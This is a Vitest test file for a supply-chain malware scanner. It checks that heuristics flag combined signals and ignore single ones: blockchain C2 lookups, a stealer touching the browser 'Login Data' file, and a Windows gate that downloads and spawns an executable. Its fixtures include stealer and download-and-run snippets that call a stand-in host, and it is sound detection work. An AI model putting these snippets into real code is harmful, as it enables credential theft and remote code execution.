import { join } from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { scan } from '../../../src/core/engine.js';
import { campaignFindings, securityPlaceholderFinding } from '../../../src/supply/campaign.js';

const app = join(import.meta.dirname, '../../fixtures/upgrade-plan-app');

describe('phase 70 supply campaign heuristics', () => {
  afterEach(() => {
    delete process.env.FULLSHIELD_EXPERIMENTAL_SUPPLY;
  });

  it('requires the combination and ignores a single signal', () => {
    const chain = campaignFindings([
      { file: 'index.js', text: "fetch('https://example.invalid/rpc'); getSignaturesForAddress()" },
    ]);
    expect(chain.map((finding) => finding.ruleId)).toContain('SUPPLY-CHAINC2-001');
    expect(campaignFindings([{ file: 'only.js', text: 'getSignaturesForAddress()' }])).toEqual([]);
    const stealer = campaignFindings([
      { file: 'steal.js', text: "const p = 'Login Data'; fetch('https://example.invalid/x')" },
    ]);
    expect(stealer.map((finding) => finding.ruleId)).toContain('SUPPLY-STEALER-001');
    expect(stealer[0]?.severity).toBe('critical');
    expect(campaignFindings([{ file: 'path.js', text: "const p = 'Login Data'" }])).toEqual([]);
    const gate = campaignFindings([
      {
        file: 'gate.js',
        text: "if (process.platform === 'win32') { require('https').get('https://example.invalid/a.exe'); require('child_process').spawn('a.exe') }",
      },
    ]);
    expect(gate.map((finding) => finding.ruleId)).toContain('SUPPLY-PLATFORMGATE-001');
    expect(campaignFindings([{ file: 'plat.js', text: "process.platform === 'win32'" }])).toEqual([]);
    expect(securityPlaceholderFinding('left-pad', '1.0.0', '0.0.1-security')?.ruleId).toBe('SUPPLY-SECHOLDER-001');
    expect(securityPlaceholderFinding('left-pad', '0.0.1-security', '0.0.1-security')).toBeUndefined();
    expect(securityPlaceholderFinding('left-pad', '1.0.0', undefined)).toBeUndefined();
  });

  it('emits none of the campaign ids on a default scan', async () => {
    const result = await scan({ cwd: app, modules: ['deps'], offline: true });
    const ids = result.findings.map((finding) => finding.ruleId);
    expect(ids.some((id) => id.startsWith('SUPPLY-CHAIN') || id.startsWith('SUPPLY-STEALER') || id.startsWith('SUPPLY-PLATFORM') || id.startsWith('SUPPLY-SECHOLDER'))).toBe(false);
  });
});
